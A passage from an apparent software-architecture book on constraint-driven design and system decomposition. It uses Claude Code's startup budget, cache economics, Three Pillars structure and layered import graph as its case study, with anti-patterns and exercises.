Sort constraints by type (hard/soft/self-imposed) and by impact (how many design decisions does this constraint influence?):

Constraint Type Impact Design Consequences
400ms startup Soft (but treated as hard) Very High 13-phase pipeline, parallel I/O, deferred imports, early input capture
Single binary deployment Hard (product requirement) High Monolith architecture, compile-time feature flags
Prompt cache economics (7x cost) Hard (infrastructure cost) High Cache latching, header stability, LIFO compaction
Bash safety Hard (user trust) High 4,400-line parser, 6-stage pipeline, OS sandboxing
State module at import DAG leaf Self-imposed Medium Accessor pattern, signal pattern, ESLint enforcement
Uniform tool contract Self-imposed Medium 52 tools share one interface

High-impact constraints are the ones worth designing around. Low-impact constraints are worth noting but should not drive architecture.

Step 3: Derive the Architecture

Take each high-impact constraint and ask: What design does this constraint demand?

The 400ms startup constraint demands: - Minimal entry point (router, not initializer) - Parallel I/O during synchronous module loading - Deferred initialization for non-critical subsystems - Explicit budget allocation per phase - Profiling infrastructure to detect regressions

The single-binary constraint demands: - Monolithic architecture (no daemon, no microservices) - Compile-time feature flags for multi-SKU shipping - Bundled dependencies (no dynamic linking)

The prompt cache constraint demands: - Stable cache keys (header latching, session-frozen configuration) - LIFO compaction (preserve cached prefix) - Cost-aware state management (latch booleans, never revert)

When multiple constraints converge on the same design decision, that decision is strongly supported. The monolith is demanded by both the startup constraint (single process is faster) and the deployment constraint (single binary is simpler). Global state is demanded by both the startup constraint (zero DI container overhead) and the call-depth constraint (no context parameter in 15+ deep call stacks).

Step 4: Test for Constraint Conflicts

Sometimes constraints conflict. The startup constraint says "defer everything." The user experience constraint says "be ready for the first prompt immediately." These conflict on MCP server initialization: deferring it saves startup time but makes the first MCP tool invocation slower.

The resolution is explicit prioritization: startup time wins because it affects every session, while MCP tool latency only affects sessions that use MCP tools. Document the trade-off so future engineers understand why MCP initialization is deferred.

When constraints conflict irreconcilably, one must give. The discipline is making the conflict visible and the resolution deliberate, rather than letting one constraint silently override another through implementation drift.

The Constraint Cascade

The most elegant property of constraint-driven design is the cascade: one constraint implies another, which implies another, producing an architecture that is internally consistent without any single designer holding the whole picture.

Claude Code's constraint cascade:

graph TD
    A["CLI tool for one user"] -->|implies| B["Single process"]
    B -->|enables| C["Global mutable state"]
    B -->|requires| D["400ms startup budget"]
    B -->|justifies| E["Monolithic binary"]

    D -->|drives| F["13-phase pipeline"]
    D -->|drives| G["Parallel I/O prefetch"]
    D -->|drives| H["Deferred initialization"]
    D -->|drives| I["Entry point as router"]

    E -->|enables| J["Shared types"]
    E -->|requires| K["Compile-time feature flags"]

    C -->|enables| L["Cache latching"]
    C -->|requires| M["Test reset function"]
    C -->|requires| N["Accessor pattern"]

    L -->|driven by| O["7x cache miss cost"]
    O -->|shapes| P["LIFO compaction"]
    O -->|shapes| Q["Header stability"]

    style A fill:#e94560,stroke:#1a1a2e,color:#fff
    style O fill:#e94560,stroke:#1a1a2e,color:#fff

Two root constraints -- "CLI tool for one user" and "7x cache miss cost" -- cascade into the entire architecture. The single-user constraint produces the monolith, global state, and startup budget. The cost constraint produces cache latching, header stability, and compaction strategy. Every other design decision is a consequence of these two roots.

This cascade is what makes the architecture feel coherent rather than assembled. It is not a collection of independent "best practices" applied in isolation. It is a web of decisions that reinforce each other because they all derive from the same constraints. Change the constraints and the entire web changes. Make it a multi-user web application and global state becomes a bug, microservices become justified, and the startup budget becomes irrelevant. Make the cost model flat-rate and cache latching becomes unnecessary overhead.

The cascade is also the best defense of your architecture against criticism. When someone says "global state is bad practice," you can trace the cascade: global state derives from single-process, which derives from single-user CLI. If those constraints hold, global state is correct. If those constraints change, global state should be reconsidered.

Anti-Patterns: Constraints Done Wrong

Anti-Pattern 1: The Phantom Constraint

A constraint that does not actually exist but is treated as immovable. "We must use PostgreSQL" when no requirement specifies a database vendor. "The API must be REST" when the only consumer is your own frontend. Phantom constraints bloat the design space with unnecessary decisions.

Detection: Ask "what breaks if we violate this constraint?" If the answer is "nothing," it is a phantom.

Anti-Pattern 2: The Ignored Constraint

The opposite: a real constraint that the team ignores. "The context window is 200K tokens" is ignored when building a system that accumulates conversation history without compaction. The system works in demos (short conversations) and fails in production (long conversations). The constraint was real all along -- ignoring it did not make it go away.

Detection: Ask "what happens at scale?" Ignored constraints always surface at scale.

Anti-Pattern 3: The Over-Constrained System

Too many self-imposed constraints, leading to a design so rigid that it cannot adapt. "No files over 300 lines" applied to a shell parser that inherently requires 4,400 lines produces 15 tiny files with complex interdependencies -- worse than the original. Not every convention should be elevated to a constraint.

Detection: Ask "is this constraint serving the system or is the system serving the constraint?" If developers are contorting code to satisfy a rule rather than to solve the problem, the constraint is over-applied.

Anti-Pattern 4: The Unconsidered Constraint

A constraint that was never explicitly identified but is implicitly shaping the design. "We've always used X framework" is a constraint hidden inside institutional habit. It constrains the design space without appearing on any constraint list, making it invisible to first principles analysis.

Detection: Review your "obvious" technical choices. Each one embeds a constraint. Make it explicit, then test it.

Key Principles

  1. Constraints are design tools, not obstacles. Every constraint eliminates mediocre solutions and narrows the space toward the few that work.
  2. Set budgets with specific numbers. "Fast" is not a constraint. "400ms" is a constraint. The specificity is what makes it useful.
  3. Constraints cascade. One constraint implies another, producing internally consistent architecture without any single designer holding the whole picture.
  4. Defer everything that can be deferred. A tight budget forces explicit prioritization of what must happen in the critical path versus what can happen later.
  5. The impossible constraint is often a measurement failure. The work that must happen is usually much less than the work that currently happens. The constraint forces the distinction.
  6. Self-imposed constraints are the mark of experience. Choosing to limit yourself -- zero external deps in the security pipeline, uniform tool contracts, import DAG leaf constraint -- produces designs that are globally coherent, not locally optimized.
  7. Document your constraint cascade. Future engineers need to understand not just what you built, but which constraints made it inevitable.

Think About It

Exercise 1: The Budget Exercise. Pick a performance-sensitive operation in your system (page load, API response, build time). Set an explicit budget in milliseconds. Decompose the budget into phases. Where is the time actually spent? What percentage is essential work versus drifted-in work? How much could you save by deferring non-essential phases?

Exercise 2: The Constraint Cascade. Draw the constraint cascade for a system you work on. Start with the root constraints (user count, deployment model, cost structure). What do they imply? Do your actual design decisions match what the constraints derive? Where do they diverge, and why?

Exercise 3: The Phantom Hunt. List every technical constraint on your current project. For each one, ask: "What breaks if we violate this?" Identify at least two phantom constraints -- constraints that feel real but survive no scrutiny. What design options would open up if you removed them?

Exercise 4: The Self-Imposed Constraint. Identify one self-imposed constraint that would improve your system's coherence. Examples: "All API endpoints follow the same response format." "No function takes more than 4 parameters." "Every error includes a recovery suggestion." Implement it for one week. Did it improve or hinder your work?

Exercise 5: The Conflict Resolution. Find two constraints in your system that conflict. (Performance vs. safety. Flexibility vs. simplicity. Backwards compatibility vs. clean design.) How is the conflict currently resolved? Is the resolution explicit and documented, or implicit and accidental? What would change if you made it deliberate?

Chapter 5: System Decomposition

Every complex system is a collection of simpler systems that someone decided to group together. The skill of system decomposition is deciding where the groups are. Get the boundaries right and each piece is small enough to understand, test, and change independently. Get them wrong and you spend your career fighting accidental coupling -- changes in one subsystem cascade unpredictably into others, every bug requires understanding the whole, and new engineers take months to become productive.

AI does not help with decomposition. You can ask a model to "break this into modules" and it will produce something plausible-looking that misses every real constraint: performance budgets, team boundaries, deployment units, security domains. Decomposition requires understanding the forces acting on a system -- the technical constraints, the organizational realities, the operational requirements -- and finding the cut lines that respect all of them simultaneously.

This chapter teaches the thinking process behind decomposition. The case study is Claude Code -- a 500K-line production AI CLI agent -- but the principles apply to any system too large for one person to hold in their head.

Why Decomposition Is Hard

Decomposition looks easy in retrospect. After the fact, every well-designed system's module boundaries seem obvious. "Of course you separate the query engine from the tool system. Of course the UI renderer is its own pillar." But before the boundaries exist, you face a continuous design space with no obvious cut lines.

The difficulty comes from three sources:

Competing forces. Every decomposition decision is a trade-off between multiple concerns. Separating the permission system from the tool executor improves testability but adds a communication boundary. Keeping them together reduces latency but creates a monolith that is hard to reason about. There is no decomposition that optimizes for all concerns simultaneously.

Hidden dependencies. The most damaging coupling is the kind you do not see until you try to change something. Two modules that share no code but both depend on the same global state are coupled. Two modules that communicate through a shared database are coupled. Two modules that must be deployed together are coupled. Decomposition must account for dependencies that do not appear in the import graph.

Future uncertainty. You are decomposing based on today's requirements, but the system will evolve. A boundary that makes sense today may be wrong in six months when a new feature needs to cross it. The best decompositions are robust to change -- they put boundaries where they are unlikely to need modification, not where they happen to be convenient right now.

These forces mean that decomposition is not a mechanical process. You cannot follow a recipe. You must think about the system's constraints, its likely evolution, and the forces acting on each potential boundary.

Top-Down vs. Bottom-Up

There are two fundamental approaches to decomposition, and experienced engineers use both -- often on the same system.

Top-Down: Divide and Conquer

Start with the whole system. Identify its primary responsibilities. Assign each responsibility to a subsystem. Repeat recursively until each subsystem is small enough to implement.

Top-down decomposition works when you understand the domain well enough to name the responsibilities. If you are building a web server, you know it needs request parsing, routing, handler dispatch, and response formatting. These responsibilities are well-established. The domain tells you where to cut.

The failure mode of top-down decomposition is premature abstraction. You divide the system into elegant subsystems that match your mental model of the domain, but your mental model is wrong. The real complexity lives at a boundary you did not anticipate, and your decomposition puts it in the worst possible place -- split across two subsystems that must coordinate tightly.

Bottom-Up: Compose from Parts

Start with the smallest useful pieces. Build utilities, then combine them into larger components, then combine those into subsystems. The structure emerges from the composition.

Bottom-up decomposition works when you do not understand the domain well enough to name the responsibilities upfront. You build what you know, see how the pieces interact, and let the architecture emerge from real constraints rather than imagined ones.

The failure mode of bottom-up decomposition is architecture drift. Without a guiding vision, each piece makes locally optimal decisions that produce globally incoherent structure. You end up with utilities that overlap, services that duplicate logic, and no clear layering.

The Pragmatic Approach

The best engineers use top-down for the first decomposition and bottom-up for refinement. Start with a rough top-down sketch -- three to five major subsystems, named by responsibility. Then build bottom-up within each subsystem, letting the internal structure emerge from implementation. Periodically step back and check whether the top-down boundaries still make sense given what you have learned.

Claude Code's Three Pillars architecture (Query Engine, Tool System, UI Renderer) was a top-down decision. The internal structure of the tool system -- the registry pattern, the execution pipeline, the permission cascade -- emerged bottom-up as the team discovered what each tool needed.

Finding Natural Seam Lines

A seam line is a place where a system can be divided with minimal coupling across the boundary. Natural seam lines exist where the system already has low coupling. Artificial seam lines require effort to maintain -- you must enforce the boundary through discipline, conventions, or technical constraints.

The Five Tests for Seam Lines

Before cutting a system at a proposed boundary, apply these five tests:

1. The Data Flow Test. Trace the primary data flows through the system. Natural seam lines run parallel to data flows, not perpendicular to them. If your proposed boundary cuts across a hot data path, every request pays the crossing cost.

In Claude Code, the boundary between the Query Engine and the Tool System is natural because data flows through them in sequence: user message enters the Query Engine, which calls the API, which returns tool requests, which cross to the Tool System for execution, which returns results back to the Query Engine. The data flow crosses the boundary twice per tool call, at well-defined points with well-defined contracts. Contrast this with a hypothetical boundary that split "text processing" from "JSON processing" -- data flows would cross that boundary dozens of times per request, because text and JSON are interleaved throughout the pipeline.

2. The Change Frequency Test. Components that change together should live together. Components that change independently should live apart. Look at your version history. Which files are always modified in the same commit? Those are tightly coupled regardless of what the module boundaries say.

Claude Code's UI Renderer changes when the terminal rendering needs work -- new components, layout changes, input handling. The Tool System changes when tools are added or modified. These two areas rarely change in the same commit. The boundary between them is natural because their change frequencies are independent.

3. The Team Boundary Test. Conway's Law states that system structure mirrors communication structure. If different teams own different subsystems, the boundaries between subsystems will reflect the boundaries between teams. This is not a bug -- it is a pragmatic recognition that coordination across team boundaries is expensive. Decompose along team lines when possible.

4. The Failure Domain Test. A failure domain is the set of components that fail together. When the API is unreachable, the Query Engine cannot function -- but the Tool System and UI Renderer can still display cached results, show error messages, and accept user input. Putting the API communication in its own subsystem means its failure does not drag down the entire system.

5. The "Could This Be a Separate Service?" Test. Imagine deploying your proposed subsystem independently -- as a separate process, a microservice, or a library. If the exercise is easy to imagine, the boundary is natural. If the exercise immediately raises questions about shared state, shared data, and tight coordination, the boundary is artificial.

Claude Code's Tool System could, in principle, be a separate service. It receives tool requests, executes them, and returns results. It does not need to know about the API, the UI, or the conversation history. The boundary is clean enough that you can imagine it running in a separate process. The Query Engine, by contrast, could not easily be separated from the context manager -- they share too much state about the conversation.

A Practical Hierarchy

When analyzing a system for decomposition, examine potential seam lines in this order:

Priority Seam Type Example
1 Trust boundary Untrusted input vs. trusted internals
2 I/O boundary Network calls vs. pure computation
3 Data domain User data vs. system configuration
4 Rate of change Stable core vs. frequently updated features
5 Technology boundary TypeScript vs. native code

Trust boundaries are the most important because they carry security implications. A misplaced trust boundary is a vulnerability. I/O boundaries are next because they determine testability -- pure computation can be tested without mocking, I/O cannot.

When to Split and When to Keep Together

Not every potential boundary should be realized. Splitting has costs: communication overhead, interface maintenance, deployment coordination, debugging difficulty. Sometimes the right answer is to keep things together.

Split When:

Independent deployment. If two components need different release cadences, split them. The tool that ships weekly should not wait for the UI that ships quarterly.

Independent scaling. If one component needs 10x more resources than another, split them so you can scale independently. In Claude Code, the Bash tool's process spawning is resource-intensive, but it runs on the user's machine, so scaling is not a concern. In a server-side agent, it would be.

Independent testing. If testing one component requires standing up another, they are too coupled. Split them so each can be tested in isolation.

Different trust levels. Code that handles untrusted input should be separated from code that operates on trusted data. The boundary between them is where validation happens.

Keep Together When:

Shared state is essential. If two components must read and write the same mutable state in real time, separating them introduces synchronization complexity that outweighs the separation benefit.

Claude Code's global state singleton (250+ fields, imported by 50+ files) is a deliberate decision to keep state together rather than distributing it across subsystems. The alternative -- passing state through dependency injection or message passing -- would add thousands of lines of plumbing to a system where every component needs to know the current model, permission mode, and session identity. The pragmatic choice: one state module with zero internal imports, accessible from everywhere.

The boundary would be crossed on every operation. If every request crosses a proposed boundary, the overhead of the crossing (serialization, validation, network) dominates the benefit of the separation.

The components share a lifecycle. If two components must start together, stop together, and recover together, separating them adds coordination complexity without independence benefit.

The Razor: Coupling vs. Cohesion

Every decomposition decision reduces to one question: does this boundary increase cohesion within the pieces more than it increases coupling between them?

Cohesion is the degree to which elements within a module belong together. High cohesion means every function, type, and constant in the module serves the same purpose. Low cohesion means the module is a grab bag of unrelated functionality.

Coupling is the degree to which modules depend on each other. Low coupling means modules can change independently. High coupling means a change in one module cascades to others.

The ideal decomposition maximizes cohesion within modules and minimizes coupling between them. In practice, you cannot optimize both simultaneously -- increasing cohesion (putting related things together) sometimes increases coupling (the related things need data from elsewhere). The art is finding the sweet spot.

Claude Code's decision to keep the permission system inside the tool pillar illustrates this trade-off. Extracting permissions into a separate pillar would increase the tool system's cohesion (it would contain only execution logic). But it would dramatically increase coupling: the permission system needs tool schemas, tool metadata, and tool-specific context. Every tool call would cross the new boundary twice (once for permission check, once for execution). The coupling cost exceeds the cohesion benefit.

The Complexity Budget

Think of your system as having a fixed complexity budget. Every boundary you add spends some of that budget on interface definition, contract maintenance, and cross-boundary debugging. Every boundary you omit spends budget on larger, harder-to-understand modules.

The art is balancing these costs. A system with too many boundaries is over-engineered -- every change requires updating interfaces, contracts, and tests across multiple modules. A system with too few boundaries is a monolith -- every change requires understanding the whole.

A practical rule of thumb: the number of major subsystems should be between 3 and 7. This maps to the cognitive limit of working memory. You should be able to draw the system's architecture on a whiteboard in under a minute, with each box representing a subsystem you can describe in one sentence.

Case Study: Claude Code's Three Pillars

Claude Code is a 500K-line TypeScript application that decomposes into three primary subsystems -- the Three Pillars. This decomposition was a top-down decision driven by the fundamental question: what does an AI CLI agent do?

The answer: it thinks (calls an LLM), it acts (executes tools), and it communicates (renders output). Three verbs, three pillars.

    subgraph Pillar1["Query Engine (Brain)"]
        direction TB

        API[API Client]
        CTX[Context Manager]
        CC[Context Compactor]
        TB[Token Budget]
    end

    subgraph Pillar2["Tool System (Hands)"]
        direction TB
        TR[Tool Registry]
        TE[Tool Executor]

        BT[Bash Tool + Parser]
        FT[File Tools]

    subgraph Pillar3["UI Renderer (Face)"]
        direction TB
        REPL[REPL Screen]
        MD[Markdown Renderer]
        INP[Input Handler]

    AL -->|"tool request"| TE
    TE -->|"permission check"| PS
    TE -->|"result"| AL
    AL -->|"streaming response"| REPL
    INP -->|"user message"| AL

    style Pillar1 fill:#1a1a2e,stroke:#e94560,color:#fff
    style Pillar2 fill:#16213e,stroke:#0f3460,color:#fff
    style Pillar3 fill:#0f3460,stroke:#e94560,color:#fff

Why These Three and Not Four or Five

A natural question: why not separate the Permission System from the Tool System? Why not make the Context Manager its own pillar?

The Permission System stays with the Tool System because permissions are meaningless without tools. Every permission rule references a tool name (Bash(git diff *), Read(./.env)). Every permission check receives tool-specific context. Separating them would require the Permission System to import tool definitions, creating a circular dependency. They share a data domain -- tool metadata -- and changing one almost always requires considering the other.

The Context Manager stays with the Query Engine because context management is inextricable from query construction. The context window budget determines what goes into the API call. The compaction decision depends on the current token usage, which depends on the current system prompt, which depends on the registered tools. Pulling the Context Manager out would require it to query the Query Engine for state it already has.

The API Client stays with the Query Engine because it exists to serve the agent loop. The API client's design -- beta header latching, prompt cache management, retry strategies -- exists entirely because the agent loop needs stable, cached, resilient model communication. Without the agent loop, the API client has no reason to exist.

The Decomposition Forces in Action

Look at how the five tests apply to this decomposition:

Data Flow Test. The primary data flow is linear: user input enters the Query Engine, the Query Engine calls the API, the API returns tool requests, tool requests cross to the Tool System, the Tool System returns results, results go back to the Query Engine, and the Query Engine sends the final response to the UI Renderer. The data flow crosses each boundary at defined points with defined types. The boundaries run parallel to the flow, not perpendicular.

Change Frequency Test. The Tool System changes most frequently -- new tools are added, existing tools are modified, permission rules evolve. The Query Engine changes when the API protocol changes, context management algorithms improve, or new caching strategies are needed. The UI Renderer changes when the terminal rendering needs work. These three change frequencies are largely independent. A new Bash tool security rule does not require a Query Engine change. A new context compaction tier does not require a UI change.

Failure Domain Test. When the API is down, the Query Engine cannot function, but the Tool System can still validate inputs and the UI can still accept user input and display cached content. When a tool crashes, the Query Engine catches the error, formats it as a tool result, and continues. When the UI renderer throws (a React rendering exception, for instance), the other two pillars are unaffected -- the conversation state and tool execution pipeline remain intact. Each pillar fails independently.

Independent Service Test. The Tool System could plausibly be a separate process that receives tool requests over a socket and returns results. The interface is narrow enough. The Query Engine could be a separate service that communicates with the API and dispatches tool requests. The UI Renderer could be a separate process that receives rendering instructions. In practice, they run in one process for simplicity, but the boundaries are clean enough that separation is architecturally feasible.

How the Pillars Communicate

The three pillars communicate through narrow, well-defined interfaces:

From To Interface Data
Query Engine Tool System tool_use block Tool name + JSON input
Tool System Query Engine tool_result block Execution result + metadata
Query Engine UI Renderer Streaming message events Text, tool progress, errors
UI Renderer Query Engine User input Text message
Tool System UI Renderer Permission dialogs Tool name, arguments, context

Five interfaces connecting three pillars. Each interface carries one type of data in one direction. The Query Engine never reaches into the Tool System's internals to check tool state. The Tool System never reads the conversation history directly. The UI Renderer never calls the API. Each pillar operates on its own data and communicates through messages.

This is the hallmark of good decomposition: the interfaces are narrow and the data flow is unidirectional where possible.

The Layer Underneath

Beneath the three pillars lies a shared infrastructure layer that every pillar depends on: global state (250+ fields), the hook engine (27 lifecycle events), session management (JSONL persistence), and telemetry (OpenTelemetry instrumentation).

graph TB
    subgraph Pillars["Three Pillars"]
        QE["Query Engine"]
        TS["Tool System"]
        UI["UI Renderer"]
    end

    subgraph Infra["Shared Infrastructure"]
        STATE["Global State<br/>250+ fields<br/>0 internal imports"]
        HOOKS["Hook Engine<br/>27 events"]
        SESSION["Session Manager<br/>JSONL persistence"]
        TELEM["Telemetry<br/>OpenTelemetry"]
    end

    QE --> STATE
    TS --> STATE
    UI --> STATE
    QE --> HOOKS
    TS --> HOOKS
    QE --> SESSION
    QE --> TELEM

    style Pillars fill:#1a1a2e,stroke:#e94560,color:#fff
    style Infra fill:#533483,stroke:#e94560,color:#fff

The infrastructure layer has a critical property: it imports nothing from the pillars. The global state module has zero imports from the rest of the codebase. The hook engine processes events without knowing which pillar generated them. This one-way dependency is enforced by a custom ESLint rule (bootstrap-isolation) that prevents the state module from importing anything that might transitively pull in pillar code.

Why does this matter? If the state module imported from the Tool System (to access tool definitions, say), and the Tool System imported from the state module (to read the current permission mode), you have a circular dependency. Now the state module cannot initialize without the Tool System, which cannot initialize without the state module. By keeping the infrastructure layer at the leaf of the import graph, every pillar can import it safely without creating cycles.

The Module Dependency Graph

The pillars decompose further into a six-layer dependency hierarchy:

Layer Contains Imports From
L0: Foundation Global state, types, constants Nothing internal
L1: Utilities Bash parser, permission evaluator, hook engine L0
L2: Services API client, MCP client, analytics L0, L1
L3: Tools Tool registry, all tool implementations L0, L1, L2
L4: Orchestration Agent loop, context assembler L0-L3
L5: UI REPL, components, layout engine L0-L4

Each layer imports only from layers below it. This is not enforced by the language -- TypeScript does not have layer-level visibility -- but it is enforced by convention and the import linting rule. Violations exist (resolved through lazy require() calls that break cycles at runtime), but they are tracked and justified.

The layer hierarchy is the decomposition within the decomposition. The Three Pillars answer "what are the major subsystems?" The layers answer "what order do they initialize, and what depends on what?"

Breaking the Layers: Lazy Loading

No layer hierarchy survives contact with reality perfectly. Circular dependencies will appear. The question is not how to prevent them entirely -- it is how to manage them when they occur.

Claude Code uses lazy require() to break cycles at runtime without breaking them at build time:

const getTeammateUtils = () =>
  require('./utils/teammate.js') as typeof import('./utils/teammate.js')

Instead of a top-level import (which executes at module load time and forces the dependency to be resolved before any code runs), the module is loaded on first call. This breaks the cycle because the dependent module does not need to be resolved during initialization. The as typeof import(...) cast preserves full type safety at the TypeScript level while deferring the actual module load to runtime.

This pattern is not a hack -- it is a deliberate choice. Alternatives like dependency injection containers would add runtime complexity and performance overhead. Event systems would add indirection that obscures the code flow. Lazy loading solves the problem simply: the module is loaded when needed, not when imported. The cycle exists in the code but does not exist at initialization time.

The key discipline: every lazy require() is documented with a comment explaining which cycle it breaks and why. Without this documentation, future engineers cannot distinguish intentional cycle-breaking from accidental lazy loading.

Decomposition Anti-Patterns

The Premature Split

You split a component before understanding its internal structure. The boundary turns out to cut through the densest part of the coupling graph. Now every change requires modifying both sides of the boundary and updating the interface between them.

Symptom: Most commits touch files on both sides of a module boundary.

Fix: Merge the components back together. Re-split only when you understand the real coupling structure. The cost of an unnecessary merge is one afternoon. The cost of maintaining a bad boundary is permanent.

The God Module

One module accumulates responsibilities because no one wants to decide where new features belong. It grows to thousands of lines with dozens of exports. New engineers import from it because "everything is there." The module becomes a dependency of everything.

Symptom: One module appears in 50+ import statements across the codebase.

Claude Code's global state module deliberately accepts this role -- it is imported by 50+ files. But it earns that position by having zero internal imports.
